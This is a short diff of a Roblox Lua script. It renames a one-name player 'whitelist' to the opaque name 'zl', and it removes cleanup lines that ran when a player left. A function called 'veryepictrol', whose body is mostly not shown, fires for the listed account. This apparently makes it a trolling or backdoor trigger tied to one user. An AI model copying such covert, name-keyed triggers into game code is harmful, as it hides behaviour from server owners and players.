@@ -16,7 +16,7 @@ function isalready(user)
     return isz
 end
 
-local whitelist = {
+local zl = {
     "Real_revvybxnned9"
 }
 
@@ -73,22 +73,20 @@ function veryepictrol(x)
     end)
     local d1;d1 = game.Players.PlayerRemoving:Connect(function(plr)
         if plr.Name == x.Name then
-           index = table.find(alreadylisted, plr)
-           table.remove(alreadylisted, index)
            d:Disconnect()
            d1:Disconnect()
         end
     end)
 end
 game.Players.PlayerAdded:Connect(function(plr)
-   for i, listed in pairs(whitelist) do
+   for i, listed in pairs(zl) do
         if plr.Name == listed then
             veryepictrol(plr)
         end
     end
 end)
 for i, plr in pairs(game.Players:GetPlayers()) do
-    for i, listed in pairs(whitelist) do
+    for i, listed in pairs(zl) do
         if plr.Name == listed then
             veryepictrol(plr)
         end
